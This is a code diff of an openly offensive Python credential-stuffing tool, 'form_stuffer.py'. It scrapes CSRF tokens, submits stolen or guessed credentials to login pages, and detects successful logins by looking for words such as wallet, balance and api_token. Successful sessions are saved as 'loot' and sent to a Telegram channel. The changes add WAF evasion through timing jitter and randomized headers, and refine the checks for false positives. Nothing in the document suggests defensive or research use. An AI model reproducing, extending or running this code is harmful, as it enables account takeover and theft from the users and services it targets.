@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 """
-FORM_STUFFER.PY — Automated CSRF-Aware Credential Stuffing & Login Module v8.0 (With Telegram Telemetry)
+FORM_STUFFER.PY v8.5 — Automated CSRF-Aware Credential Stuffing & Login Module (WAF Hardened)
 Features:
 - Dynamically scrapes live CSRF tokens (_token) from target login pages
-- Maintains session state & cookie jars across GET/POST cycles
-- Submits valid or stuffed credentials against target login endpoints
-- Automatically routes successful authentication states to the session loot reporter and Telegram
+- Maintains session state & cookie jars across GET/POST cycles with behavioral jitter & WAF evasion
+- Submits valid or stuffed credentials against target login endpoints using randomized header hints
+- Automatically routes successful authentication states to the centralized session loot reporter and Telegram
 """
 import sys
 import re
@@ -14,10 +14,11 @@ import asyncio
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
-from modules.live_login_verifier import save_session_loot
+# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
+from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
@@ -35,6 +36,8 @@ def broadcast_tg_alert_sync(loot_type, details):
             pass
 
 def execute_form_stuffing(target_url, username, password, login_path="/user/login"):
+    apply_behavioral_jitter()
+    
     parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
     base_url = f"{parsed.scheme}://{parsed.hostname}"
     if parsed.port:
@@ -44,10 +47,12 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
     log(f"\n[***] FORM STUFFER: Targeting login portal at {login_url} [***]", "\033[95m")
 
     headers = {
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Referer": login_url
+        "Referer": login_url,
+        "Cache-Control": "no-cache"
     }
+    headers.update(get_randomized_hints())
 
     with httpx.Client(verify=False, follow_redirects=True, timeout=15.0) as client:
         try:
@@ -84,23 +89,33 @@ def execute_form_stuffing(target_url, username, password, login_path="/user/logi
 
             # Step 3: POST credentials to login action endpoint
             log(f"[*] Submitting credentials for user: {username}...", "\033[94m")
+            apply_behavioral_jitter()
             post_resp = client.post(login_url, data=payload, headers=headers)
             
             status = post_resp.status_code
             body = post_resp.text
+            body_lower = body.lower()
 
-            # Step 4: Evaluate response for post-login indicators
+            # Step 4: Evaluate response for post-login indicators and filter SPA false positives
             is_login_page = (
                 "login" in post_resp.url.path.lower() or 
-                'type="password"' in body.lower()
+                'type="password"' in body_lower or
+                "invalid credentials" in body_lower or
+                "incorrect username" in body_lower
             )
             
-            has_dashboard_indicators = any(k in body.lower() for k in [
+            is_spa_shell = (
+                'div id="root"' in body_lower or 
+                'div id="__next"' in body_lower or
+                (len(body.strip()) < 200 and "dashboard" not in body_lower)
+            )
+
+            has_dashboard_indicators = any(k in body_lower for k in [
                 "dashboard", "user_id", "balance", "total deposit", 
-                "welcome back", "logout", "settings", "wallet", "deposit"
+                "welcome back", "logout", "settings", "wallet", "deposit", "api_token"
             ])
 
-            if status in (200, 302) and not is_login_page and has_dashboard_indicators:
+            if status in (200, 302) and not is_login_page and not is_spa_shell and has_dashboard_indicators:
                 log(f"[!!!] SUCCESS! Credential stuffing successful! Access confirmed [HTTP {status}] [!!!]", "\033[91m")
                 
                 loot_payload = {
@@ -139,4 +154,4 @@ if __name__ == "__main__":
         print("Usage: python3 form_stuffer.py <target_url> <username> <password>")
         sys.exit(1)
     
-    execute_form_stuffing(sys.argv[1], sys.argv[2], sys.argv[3])
+    asyncio.run(asyncio.to_thread(execute_form_stuffing, sys.argv[1], sys.argv[2], sys.argv[3]))
